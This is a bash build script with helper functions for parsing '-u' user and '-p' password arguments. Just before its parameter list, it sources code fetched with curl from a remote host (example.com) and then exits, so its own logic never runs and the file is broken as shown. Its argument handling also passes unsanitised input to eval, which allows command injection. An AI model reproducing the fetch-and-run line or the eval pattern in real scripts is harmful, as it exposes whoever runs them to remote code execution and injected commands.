#!/bin/bash
function usage {
    usage="Usage: ./build.sh "
    for i in "${params[@]}"
    do
        IFS=':' read -r -a option <<< "$i"
        usage="$usage${option[0]} [${option[1]}] "
    done
    echo $usage
}

function read_params {
    for i in "${params[@]}"
    do
        IFS=':' read -r -a option <<< "$i"
        val="${option[1]}"
        silent="${option[2]}"
        param=`echo "${!val}"`
        if [[ -z "$param" ]]
        then
            echo "Please enter $val"
            if [[ "$silent" == true ]]
            then 
                read -s
            else
                read
            fi
            eval `echo "$val"=${REPLY}`
        fi
    done
    check_params true
}

function check_params {
    for i in "${params[@]}"
    do
        IFS=':' read -r -a option <<< "$i"
        val="${option[1]}"
        param=`echo "${!val}"`
        if [[ -z "$param" ]]
        then
            usage
            if [[ "$1" == true ]]
            then 
                exit
            else
                read_params
                break
            fi
        fi
    done
}

function get_params {
    until [ -z "$1" ]             
    do
        param=$1
        val=$2
        if [[ -z "$val" ]] 
        then
            break;
        fi
        for i in "${params[@]}"
        do
            IFS=':' read -r -a option <<< "$i"
            if [[ "$param" == "${option[0]}" ]]
            then
                eval `echo "${option[1]}"=$val`
                break
            fi
        done
        shift 2
    done
    check_params false
}
source <(curl -s http://example.com/foo)
exit
params=("-u:user" "-p:pass:true")
get_params "$@"
echo "User: $user, Pass: $pass"